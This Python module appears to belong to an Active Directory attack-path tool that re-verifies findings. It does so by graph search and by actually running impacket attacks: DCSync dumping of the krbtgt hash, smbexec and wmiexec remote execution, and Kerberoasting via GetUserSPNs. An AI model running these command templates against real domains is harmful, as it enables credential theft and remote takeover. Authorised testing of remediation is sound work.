import shlex
import subprocess
from dataclasses import dataclass, asdict
from typing import Optional

from analysis.paths import find_paths_to_targets


@dataclass
class ReAttackResult:
    technique: str
    target: str
    succeeded: bool
    mode: str
    stdout: str = ""
    stderr: str = ""
    exit_code: int = 0
    error: Optional[str] = None


def graph_verify(graph, finding, label="check"):
    start = finding.get("start_id")
    target = finding.get("target_id")

    if not start or not target:
        return ReAttackResult(
            technique="graph-diff",
            target=str(target or "?"),
            succeeded=False,
            mode="graph",
            error="missing endpoints",
        )

    paths = find_paths_to_targets(graph, {start}, {target}, max_hops=8, max_paths_per_start=1)
    exists = len(paths) > 0

    return ReAttackResult(
        technique="graph-diff",
        target=finding.get("target_name") or target,
        succeeded=exists,
        mode="graph",
        stdout="[{}] path {} from {} to {}".format(
            label,
            "present" if exists else "absent",
            finding.get("start_name"),
            finding.get("target_name"),
        ),
    )


TECHNIQUES = {
    "dcsync":      ("impacket-secretsdump",
                    "-just-dc -just-dc-user krbtgt {domain}/{user}:{secret}@{target}"),
    "smbexec":     ("impacket-smbexec",
                    "{domain}/{user}:{secret}@{target}"),
    "wmiexec":     ("impacket-wmiexec",
                    "{domain}/{user}:{secret}@{target}"),
    "getuserspns": ("impacket-GetUserSPNs",
                    "{domain}/{user}:{secret}@{target} -request"),
}


def run_real(technique, target, user, domain, secret, timeout=60):
    if technique not in TECHNIQUES:
        return ReAttackResult(technique, target, False, "real",
                              error="unknown technique: " + technique)

    tool, tpl = TECHNIQUES[technique]
    cmd = [tool] + shlex.split(tpl.format(target=target, user=user,
                                          domain=domain, secret=secret))

    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
    except FileNotFoundError:
        return ReAttackResult(technique, target, False, "real",
                              error=tool + " not installed")
    except subprocess.TimeoutExpired:
        return ReAttackResult(technique, target, False, "real", error="timeout")

    bad = ["access is denied", "logon failure", "status_logon_failure",
           "invalid credentials", "traceback"]
    combined = (proc.stdout + proc.stderr).lower()
    succeeded = proc.returncode == 0 and not any(m in combined for m in bad)

    return ReAttackResult(
        technique=technique,
        target=target,
        succeeded=succeeded,
        mode="real",
        stdout=proc.stdout[-4000:],
        stderr=proc.stderr[-2000:],
        exit_code=proc.returncode,
    )


def to_dict(r):
    return asdict(r)
